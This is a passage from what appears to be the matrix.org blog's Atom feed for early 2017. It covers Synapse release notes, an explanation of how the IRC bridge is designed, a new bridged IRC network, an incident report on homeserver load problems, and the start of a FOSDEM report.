 	&lt;li&gt;Fix issue with long language values in pushers API (PR &lt;a class=&quot;issue-link js-issue-link ghh-issue-x tooltipstered&quot; title=&quot;&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;1925&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;1925&quot; data-id=&quot;208403542&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#1925&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix a race in transaction queue (PR &lt;a class=&quot;issue-link js-issue-link ghh-issue-x tooltipstered&quot; title=&quot;&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;1930&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;1930&quot; data-id=&quot;208932693&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#1930&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix dynamic thumbnailing to preserve aspect ratio. Thanks to &lt;a class=&quot;user-mention&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;jkolo&quot;&gt;&lt;span class=&quot;ghh-user-x tooltipstered&quot; title=&quot;&quot;&gt;@jkolo&lt;&#x2F;span&gt;&lt;&#x2F;a&gt;! (PR &lt;a class=&quot;issue-link js-issue-link ghh-issue-x tooltipstered&quot; title=&quot;&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;1945&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;1945&quot; data-id=&quot;210167714&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#1945&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix device list update to not constantly resync (PR &lt;a class=&quot;issue-link js-issue-link ghh-issue-x tooltipstered&quot; title=&quot;&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;1964&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;1964&quot; data-id=&quot;211092538&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#1964&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix potential for huge memory usage when getting device that have changed (PR &lt;a class=&quot;issue-link js-issue-link ghh-issue-x tooltipstered&quot; title=&quot;&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;1969&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;1969&quot; data-id=&quot;212091226&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#1969&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>An Adventure in IRC-Land</title>
        <published>2017-03-14T00:00:00+00:00</published>
        <updated>2017-03-14T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2017/03/14/an-adventure-in-irc-land/" type="text/html"/>
        <id>https://matrix.org/blog/2017/03/14/an-adventure-in-irc-land/</id>
        
        <content type="html">&lt;p&gt;Hi everyone. I&#x27;m Kegan, one of the core developers at matrix.org. This is the first in a series on the matrix.org IRC bridge. The aim of this series is to try to give a behind the scenes look at how the IRC bridge works, what kinds of problems we encountered, and how we plan to scale in the future. This post looks at how the IRC bridge actually works.&lt;&#x2F;p&gt;
&lt;p&gt;Firstly, what is &amp;quot;bridging&amp;quot;? The simple answer is that it is a program which maps between different messaging protocols so that users on different protocols can communicate with each other. Some protocols may have features which are not supported in the other (typing notifications in Matrix, DCC - &lt;em&gt;direct&lt;&#x2F;em&gt; file transfers - in IRC). This means that bridging will always be &amp;quot;inferior&amp;quot; to just using the respective protocol. That being said, where there is common ground a bridge can work well; all messaging protocols support sending and receiving text messages for example. As we&#x27;ll see however, the devil is in the detail...&lt;&#x2F;p&gt;
&lt;p&gt;A lot of existing IRC bridges for different protocols share one thing in common: they use a single global bot to bridge traffic. This bot listens to all messages from IRC, and sends them to the other network. The bot also listens for messages from users on the other network, and sends messages on their behalf to IRC. This is a lot easier than having to maintain dedicated TCP connections for each user. However, it isn&#x27;t a great experience for IRC users as they:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;Don&#x27;t know who is reading messages on a channel as there is just 1 bot in the membership list.&lt;&#x2F;li&gt;
 	&lt;li&gt;Cannot PM users on the other network.&lt;&#x2F;li&gt;
 	&lt;li&gt;Cannot kick&#x2F;ban users on the other network without affecting everyone else.&lt;&#x2F;li&gt;
 	&lt;li&gt;Cannot bing&#x2F;mention users on the other network easily (tab completion).&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
We made the decision very early on that we would keep dedicated TCP connections for each Matrix user. This means every Matrix user has their own tiny IRC client. This has its own problems:
&lt;ul&gt;
 	&lt;li&gt;It involves multiple connections to the IRCd so you need special permission to set up an i:line.&lt;&#x2F;li&gt;
 	&lt;li&gt;You need to be able to support identification of individual users (via ident or unique IPv6 addresses).&lt;&#x2F;li&gt;
 	&lt;li&gt;With all these connections to the same IRC channels, you need to have some way to identify which incoming messages have already been handled and which have not.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;mapping-rooms&quot;&gt;Mapping Rooms&lt;&#x2F;h3&gt;
&lt;p&gt;So now that we have a way to send and receive messages, how do we map the rooms&#x2F;channels between protocols? This isn&#x27;t as easy as you may think. We can have a single static one-to-one mapping:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;All messages to &lt;code&gt;#channel&lt;&#x2F;code&gt; go to &lt;code&gt;!abcdef:matrix.org&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
 	&lt;li&gt;All messages from &lt;code&gt;!abcdef:matrix.org&lt;&#x2F;code&gt; go to &lt;code&gt;#channel&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
 	&lt;li&gt;All PMs between &lt;code&gt;@alice:matrix.org&lt;&#x2F;code&gt; and Bob go to &lt;code&gt;!wxyz:matrix.org&lt;&#x2F;code&gt; and the respective PM on IRC.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
In order to make PMs secure, we need to limit who can access the room. This is done by making the Matrix PM room &quot;invite-only&quot;. This can cause problems though if the Matrix user ever leaves that room: they won&#x27;t be able to ever re-join! The IRC bridges get around this by allowing Matrix users to &lt;em&gt;replace&lt;&#x2F;em&gt; their dedicated PM room with a new room, and by checking to make sure that the Matrix user is inside the room before sending messages.
&lt;p&gt;Then you have problem of &amp;quot;ownership&amp;quot; of rooms. Who should be able to kick users in a bridged room? There are two main scenarios to consider:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;The IRC channel has existed for a while and there are existing IRC channel operators.&lt;&#x2F;li&gt;
 	&lt;li&gt;The IRC channel does not exist, but there are existing Matrix moderators.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
In the first case, we want to defer ownership to the channel operators. This is what happens by default for all bridged IRC channels on matrix.org. The Matrix users have no power in the room, and are at the mercy of the IRC channel operators. The channel operators are represented by virtual Matrix users in the room. However, they do not have any power level: they are at the same level as real Matrix users. Why? The bridge does this because, unlike IRC, it&#x27;s not possible in Matrix to bring a user to the same level as yourself (e.g &lt;code&gt;+o&lt;&#x2F;code&gt;), and then downgrade them back to a regular user (e.g. &lt;code&gt;-o&lt;&#x2F;code&gt;). Instead, the bridge bot itself acts as a custodian for the room, and performs privileged IRC operations (topic changing, kickbans, etc) on the IRC channel operator&#x27;s behalf.
&lt;p&gt;In the second case, we want to defer ownership to the Matrix moderators. This is what happens when you &amp;quot;provision a room&amp;quot; in Matrix. The bridge will PM a currently online channel operator and ask for their permission to bridge to Matrix. If they accept, the bridge is made and the power levels in the pre-existing Matrix room are left untouched, giving moderators in Matrix control over the room. However, this power doesn&#x27;t extend completely to IRC. If a Matrix moderator grants moderator powers to another Matrix user, this will not be mapped to IRC. Why? It&#x27;s not possible for the bridge to give chanops to any random user on any random IRC channel, so it cannot always honour the request. This relies on the humans on either side of the bridge to communicate and map power accordingly. This is done on purpose as there is no 100% perfect mapping between IRC powers and Matrix powers: it&#x27;s always going to need to compromise which only a human can make.&lt;&#x2F;p&gt;
&lt;p&gt;Finally, there is the problem of one-to-many mappings. It is possible to have two Matrix rooms bridged to the same IRC channel. The problem occurs when a Matrix user in one room speaks. The bridge can easily map that to IRC, but unless it &lt;em&gt;also&lt;&#x2F;em&gt; maps it back to Matrix, the message will never make it to the 2nd Matrix room. The bridge cannot control&#x2F;puppet the Matrix user who spoke, so instead it creates a virtual Matrix user to represent that &lt;em&gt;real&lt;&#x2F;em&gt; Matrix user and then sends the message into the 2nd Matrix room. Needless to say, this can be quite confusing and we strongly discourage one-to-many mappings for this reason.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;mapping-messages&quot;&gt;Mapping Messages&lt;&#x2F;h3&gt;
&lt;p&gt;Mapping Matrix messages to IRC is rather easy for the most part. Messages are passed from the Homeserver to the bridge via the AS API, and the bridge sends a textual representation of the message to IRC using the IRC connection for that Matrix user. The &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-appservice-irc&#x2F;issues&#x2F;258&quot;&gt;exact form&lt;&#x2F;a&gt; of the text for images, videos and long text can be quite subjective, and there is inevitably some data loss along the way. For example, you can send big text headings, tables and lists in Matrix, but there is no equivalent on IRC. Thankfully, most Matrix users are sending the corresponding markdown and so the formatting can be reasonably preserved by just sending the plaintext (markdown) body.&lt;&#x2F;p&gt;
&lt;p&gt;Mapping IRC messages to Matrix is more difficult: not because it&#x27;s hard to represent the message in Matrix, but because of the architecture of the bridge. The bridge maintains separate connections for each Matrix user. This means the bridge might have, for example, 5 users (and hence connections) on the &lt;em&gt;same channel&lt;&#x2F;em&gt;. When an IRC user sends a message, the bridge gets 5 copies of the message. How does the bridge know:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;If the message has already been sent?&lt;&#x2F;li&gt;
 	&lt;li&gt;If the message is an intentional duplicate?&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
The IRC protocol does not have message IDs, so the bridge cannot de-duplicate messages as they arrive. Instead, it &quot;nominates&quot; a single user&#x27;s connection to be responsible for delivering messages from that channel. This introduces another problem though. Long-lived TCP connections are fickle things, and can fail without any kind of visible warning until you try to send bytes down it. If a user&#x27;s connection drops, another user needs to take over responsibility for delivering messages. This is what the &quot;IRC Event Broker&quot; class does. It allows users to &quot;steal&quot; messages if the bridge has any indication that the connection in charge has dropped. This technique has worked well for us, and gives us the ability to have more robust connections to the channel than with one TCP connection alone.
&lt;h3 id=&quot;admin-rooms&quot;&gt;Admin Rooms&lt;&#x2F;h3&gt;
&lt;p&gt;Admin rooms are private Matrix rooms between a real Matrix user and the bridge bot. It allows the Matrix user to control their connection to IRC. It allows:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;The IRC nick to be changed.&lt;&#x2F;li&gt;
 	&lt;li&gt;The ability to issue &#x2F;whois commands.&lt;&#x2F;li&gt;
 	&lt;li&gt;The ability to bypass the bridge and send raw IRC commands directly down the TCP connection (e.g. MODE commands).&lt;&#x2F;li&gt;
 	&lt;li&gt;The ability to save a NickServ password for use when the bridge reconnects you.&lt;&#x2F;li&gt;
 	&lt;li&gt;The ability to disconnect from the network entirely.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
To perform these actions, Matrix users send a text message which starts with a command name, e.g &lt;code&gt;!whois $ARG&lt;&#x2F;code&gt;. Like all commands, you expect to get a reply once you&#x27;ve issued it. However, IRC makes this extremely difficult to do. There is no request&#x2F;response pair like there is with HTTP requests. Instead, the IRC server may:
&lt;ul&gt;
 	&lt;li&gt;Ignore the request entirely.&lt;&#x2F;li&gt;
 	&lt;li&gt;Send an error you&#x27;re aware of (in the RFC&#x2F;most servers)&lt;&#x2F;li&gt;
 	&lt;li&gt;Send some information which can be assumed to indicate success.&lt;&#x2F;li&gt;
 	&lt;li&gt;Send an error you&#x27;re unaware of.&lt;&#x2F;li&gt;
 	&lt;li&gt;Send some information which &lt;em&gt;sometimes&lt;&#x2F;em&gt; indicates success.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
This makes it very difficult to know if a request succeeded or failed, and I&#x27;ll go into more detail in the next post which focuses on problems we&#x27;ve encountered when developing the IRC bridge. This room is also used to inform the Matrix user about general information about their IRC connection, such as when their connection has been lost, or if there are any errors (e.g. &quot;requires chanops to do this action&quot;). The bridge makes no effort to parse these errors, because it doesn&#x27;t always know what caused the error to happen.
&lt;h3 id=&quot;wrapup&quot;&gt;Wrapup&lt;&#x2F;h3&gt;
&lt;p&gt;Developing a comprehensive IRC bridge is a very difficult task. This post has outlined a few of the ways in which we&#x27;ve designed our bridge, and some of the general problems in this field. The bridge is constantly improving as we discover new edge cases with the plethora of IRCd implementations out there. The next post will look at some of these edge cases and look back at some previous outages and examine why they occurred.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>New bridged IRC network: GIMPNet</title>
        <published>2017-03-06T00:00:00+00:00</published>
        <updated>2017-03-06T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2017/03/06/new-bridged-irc-network-gimpnet/" type="text/html"/>
        <id>https://matrix.org/blog/2017/03/06/new-bridged-irc-network-gimpnet/</id>
        
        <content type="html">&lt;p&gt;Hey everyone! As of last week, we are now bridging irc.gimp.org (GIMPNet) for all your GTK+&#x2F;GNOME needs! It&#x27;s running a bleeding-edge version of the IRC bridge which supports basic chanops syncing from IRC to Matrix. This means that if an IRC user gives chanops to a Matrix connection, the bridge will give that Matrix user moderator privileges in the room, allowing them to set the room topic&#x2F;avatar&#x2F;alias&#x2F;etc! We hope this will make customising Matrix-bridged rooms a lot easier.&lt;&#x2F;p&gt;
&lt;p&gt;For a more complete list of current and future bridged IRC networks, see the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-appservice-irc&#x2F;issues&#x2F;208&quot;&gt;official wishlist&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Synapse 0.19.2 is out</title>
        <published>2017-02-21T00:00:00+00:00</published>
        <updated>2017-02-21T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2017/02/21/synapse-0-19-2-is-out/" type="text/html"/>
        <id>https://matrix.org/blog/2017/02/21/synapse-0-19-2-is-out/</id>
        
        <content type="html">&lt;p&gt;We just pushed &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&quot;&gt;Synapse 0.19.2&lt;&#x2F;a&gt;, which contains a single but important fix for protecting event visibility when accessed via the &lt;code&gt;&#x2F;context&lt;&#x2F;code&gt; API. Please upgrade from &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
&lt;h3 id=&quot;changes-in-synapse-v0-19-2-2017-02-20&quot;&gt;Changes in synapse v0.19.2 (2017-02-20)&lt;&#x2F;h3&gt;
&lt;ul&gt;
 	&lt;li&gt;Fix bug with event visibility check in &#x2F;context&#x2F; API. Thanks to Tokodomo for pointing it out! (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;1929&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;1929&quot; data-id=&quot;208902437&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#1929&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Load problems on the Matrix.org homeserver</title>
        <published>2017-02-17T00:00:00+00:00</published>
        <updated>2017-02-17T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2017/02/17/load-problems-on-the-matrix-org-homeserver/" type="text/html"/>
        <id>https://matrix.org/blog/2017/02/17/load-problems-on-the-matrix-org-homeserver/</id>
        
        <content type="html">&lt;p&gt;Hi folks,&lt;&#x2F;p&gt;
&lt;p&gt;Since FOSDEM we&#x27;ve seen even more interest in Matrix than normal, and we&#x27;ve been having some problems getting the Matrix.org homeserver to keep up with demand.  This has resulted in performance being slightly slower than normal at peak times, but the main impact has been the additional traffic exacerbating outages on the homeserver - either by revealing new failure modes, or making it harder to recover rapidly after something goes wrong.&lt;&#x2F;p&gt;
&lt;p&gt;Specifically: on Friday afternoon we had a service disruption caused by someone sending an unusual event into Matrix HQ.  It turns out that both matrix-android-sdk and matrix-ios-sdk based clients (e.g. Riot&#x2F;Android and iOS) handled this naively by simply resyncing the room state... which has been fine in the past, but not when you have several hundred clients actively syncing the room, and resulted in a thundering herd effect which overloaded the server for ~10 mins or so whilst they all resynced the room (which, in turn, nowadays, involves calculating and syncing several MB of JSON state to each client).  The traffic load was then high enough that it took the server a further 10-20 minutes for the server to fully catch up and recover after the herd had dissipated.  We then had a repeat performance on Monday morning of the same failure mode.&lt;&#x2F;p&gt;
&lt;p&gt;Similarly, we had disruption last night after a user who hadn&#x27;t used the service for ages logged on for the first time and rapidly caught up on a few rooms which literally had &lt;em&gt;millions&lt;&#x2F;em&gt; of unread messages in them.  Generally this would be okay, but the combination of loaded DB and the sheer number of notifications being deleted ended up with 4 long-running DB deletes in parallel.  This seems to have caused postgres to lock the event_actions_table more aggressively than we&#x27;d expect, blocking other queries which were trying to access it... causing most requests to block until the deletes were over.  At the current traffic volumes this meant that the main synapse process tried to serve thousands of simultaneous requests as they stacked up and ran out of filehandles within about 10 minutes and wedged the whole synapse solid before the DB could unblock.  Irritatingly, it turns out our end-to-end monitoring has a bug where it in turn can crash on receiving a 500 from synapse, so despite having PagerDuty all set up and running (and having been receiving pages for traffic delays over the last few weeks)... we didn&#x27;t get paged when we got actual failed traffic rather than slow traffic, which delayed resolving the issue.  Finally, whilst rolling out a fix this afternoon, we again hit issues with the traffic load causing more problems than we were expecting, making a routine redeploy distinctly more disruptive.&lt;&#x2F;p&gt;
&lt;p&gt;So, what are we doing about this?&lt;&#x2F;p&gt;
&lt;ol&gt;
 	&lt;li&gt;Fix the root causes:
&lt;ul&gt;
 	&lt;li&gt;The &#x27;android&#x2F;iOS thundering herd&#x27; bug is being worked on both the android&#x2F;iOS side (fixing the naive behaviour) and the server side.  A temporary mitigation is in now place which moves the server-side code to worker processes so that worst case it can&#x27;t take out the main synapse process and can scale better.&lt;&#x2F;li&gt;
 	&lt;li&gt;The &#x27;event_push_actions table is inefficient&#x27; bug had &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;1916&quot;&gt;already been fixed&lt;&#x2F;a&gt; - so this was a matter of rushing through the hotfix to matrix.org before we saw a recurrence.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
 	&lt;li&gt;Move to faster hardware.  Our current DB master is a &quot;fast when we bought it 5 years ago&quot; machine whose IO is simply starting to saturate (6x 300GB 10krpm disks in RAID5, fwiw), which is maxing out at around 500IOPS and 20MB&#x2F;s of random access, and acting as a *very* hard limit to the current synapse performance.  We&#x27;re currently in the process of evaluating SSD-backed IO for the DB (in fact, we&#x27;re already running a DB slave), and assuming this tests out okay we&#x27;re hoping to migrate next week, which should give us a 10x-20x speed up on disk IO and buy considerable headroom.  Watch this space for details.&lt;&#x2F;li&gt;
 	&lt;li&gt;Make synapse faster.  We&#x27;re continuing to plug away at optimisations (e.g. &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;1923&quot;&gt;stuff like this&lt;&#x2F;a&gt;), but these are reaching the point of diminishing returns, especially relative to the win from faster hardware.&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix the end-to-end monitoring.  &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrixmon&#x2F;commit&#x2F;9481da67b87c1d5142dbc76d9e4b6eb29c56398b&quot;&gt;This already happened&lt;&#x2F;a&gt;.&lt;&#x2F;li&gt;
 	&lt;li&gt;Load-test before deploying.  This is hard, as you really need to test against precisely the same traffic profile as live traffic, and that&#x27;s hard to simulate.  We&#x27;re thinking about ways of fixing this, but the best solution is probably going to be clustering and being able to do incremental redeploys to gradually test new changes.  On which note:&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix synapse&#x27;s architectural deficiencies to support clustering, allowing for rolling zero-downtime redeploys, and better horizontal scalability to handle traffic spikes like this.  We&#x27;re choosing not to fix this in synapse, but we are currently in full swing implementing &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;dendrite&quot;&gt;dendrite&lt;&#x2F;a&gt; as a next-generation homeserver in Golang, architected from the outset for clustering and horizontal scalability.  N.B. most of the exciting stuff is happening on &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;dendrite&#x2F;branches&quot;&gt;feature branches&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;gomatrixserverlib&quot;&gt;gomatrixserverlib&lt;&#x2F;a&gt; atm. Also, we&#x27;re deliberately taking the time to try to get it right this time, unlike bits of synapse which were something of a rush job.  It&#x27;ll be a few weeks before dendrite is functional enough to even send a message (let alone finish the implementation), but hopefully faster hardware will give the synapse deployment on matrix.org enough headroom for us to get dendrite ready to take over when the time comes!&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
The good news of course is that you can run your own synapse today to avoid getting caught up in this operational fun &amp; games, and unless you&#x27;re planning to put tens of thousands of daily active users on the server you should be okay!
&lt;p&gt;Meanwhile, please accept our apologies for the instability and be assured that we&#x27;re doing everything we can to get out this turbulence as rapidly as possible.&lt;&#x2F;p&gt;
&lt;p&gt;Matthew&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Synapse 0.19.1 released</title>
        <published>2017-02-14T00:00:00+00:00</published>
        <updated>2017-02-14T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2017/02/14/synapse-0-19-1-released/" type="text/html"/>
        <id>https://matrix.org/blog/2017/02/14/synapse-0-19-1-released/</id>
        
        <content type="html">&lt;p&gt;Hi folks,&lt;&#x2F;p&gt;
&lt;p&gt;We&#x27;re a little late with this, but Synapse 0.19.1 was released last week. The only change is a bugfix to a regression in room state replication that snuck in during the performance improvements that landed in 0.19.0. Please upgrade if you haven&#x27;t already. We&#x27;ve also fixed the Debian repository to make installing Synapse easier on Jessie by including backported packages for stuff like Twisted where we&#x27;re forced to use the latest releases.&lt;&#x2F;p&gt;
&lt;p&gt;You can grab it from &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;&lt;&#x2F;a&gt; as always.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;changes-in-synapse-v0-19-1-2017-02-09&quot;&gt;Changes in synapse v0.19.1 (2017-02-09)&lt;&#x2F;h3&gt;
&lt;ul&gt;
 	&lt;li&gt;Fix bug where state was incorrectly reset in a room when synapse received an event over federation that did not pass auth checks (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;1892&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;1892&quot; data-id=&quot;206218885&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#1892&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>FOSDEM 2017 report</title>
        <published>2017-02-06T00:00:00+00:00</published>
        <updated>2017-02-06T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2017/02/06/fosdem-2017-report/" type="text/html"/>
        <id>https://matrix.org/blog/2017/02/06/fosdem-2017-report/</id>
        
        <content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;FOSDEM this year was even more crazy and incredible than ever - with attendance up from 6,000 to 9,000 folks, it&#x27;s almost impossible to describe the atmosphere. Matt Jordan from Asterisk describes it as &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;mattcjordan&#x2F;status&#x2F;827562586119958528&quot;&gt;DisneyWorld for OSS Geeks&lt;&#x2F;a&gt;, but it&#x27;s even more than that: it&#x27;s basically a corporeal representation of the whole FOSS movement.  There is no entrance fee; there is no intrusive sponsorship; there is no corporate presence: it&#x27;s just a venue for huge numbers of FOSS projects and their users and communities to come together in one place (the Université Libre de Bruxelles) and talk and learn.  Imagine if someone built a virtual world with storefronts for every open source project imaginable, where you could chat to the core team, geek out with other users, or gather in auditoriums to hear updates on the latest projects &amp;amp; ideas.  Well, this is FOSDEM... except even better, it&#x27;s in real life.  With copious amounts of Belgian beer.&lt;&#x2F;p&gt;
&lt;p&gt;Anyway: this year we had our normal stand on the 2nd floor of K building, sharing the Realtime Lounge chill-out space with the XMPP Standards Foundation.  This year we had a larger representation than ever before with Matthew, Erik and Luke from the London team as well as Manu &amp;amp; Yannick from Rennes - which is just as well given all 5 of us ended up speaking literally non-stop from 10am to 6pm on both Saturday &amp;amp; Sunday (and then into the night as proceedings deteriorated&#x2F;evolved into an impromptu Matrix meetup with Coffee, uhoreg, tadzik, realitygaps and others!).  The level of interest at the Matrix booth was frankly phenomenal: a major change from the last two FOSDEMs in that this year pretty much everyone had already heard of Matrix, and were most likely to want to enthuse about features and bugs in Synapse or Riot, or geek out about writing new bridges&#x2F;bots&#x2F;clients, or trying to work out a way to incorporate Matrix into their own projects or companies.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;hashtag&#x2F;RTCLounge?src=hash&quot;&gt;#RTCLounge&lt;&#x2F;a&gt; with &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;ara4n&quot;&gt;@ara4n&lt;&#x2F;a&gt; from &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;matrixdotorg&quot;&gt;@matrixdotorg&lt;&#x2F;a&gt; busy demoing cool stuff &lt;a href=&quot;https:&#x2F;&#x2F;t.co&#x2F;Vc0uLEceQP&quot;&gt;pic.twitter.com&#x2F;Vc0uLEceQP&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;&amp;mdash; miconda (@miconda) &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;miconda&#x2F;status&#x2F;827849923077013504&quot;&gt;February 4, 2017&lt;&#x2F;a&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2017&#x2F;02&#x2F;04&#x2F;synapse-0-19-is-here-just-in-time-for-fosdem&quot;&gt;Synapse 0.19&lt;&#x2F;a&gt; and Riot 0.9.7 were also released on Saturday to try to ensure that anyone joining Matrix for the best time at FOSDEM were on the latest &amp;amp; greatest code - especially given the performance and E2E fixes present in both.  Amazingly the last-minute release didn&#x27;t backfire: if you haven&#x27;t upgraded to Synapse 0.19 we recommend going so asap.  And if you&#x27;re a Riot user, make sure you&#x27;re on the latest version :)&lt;&#x2F;p&gt;
